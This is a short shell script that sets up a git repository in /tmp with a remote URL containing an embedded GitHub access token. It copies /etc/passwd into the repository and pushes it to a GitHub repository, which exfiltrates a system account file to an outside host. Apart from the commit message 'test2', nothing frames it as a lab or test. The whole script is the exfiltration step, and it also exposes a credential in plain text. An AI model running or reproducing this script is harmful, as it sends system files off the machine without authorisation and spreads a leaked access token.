#!/bin/sh
cd /tmp/
mkdir origin
cd origin
git init .
git remote add origin https://git6ww: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@github.com/git6ww/Post.git
git pull origin master
cp /etc/passwd .
git add passwd 
git commit -m "test2"
git push origin master
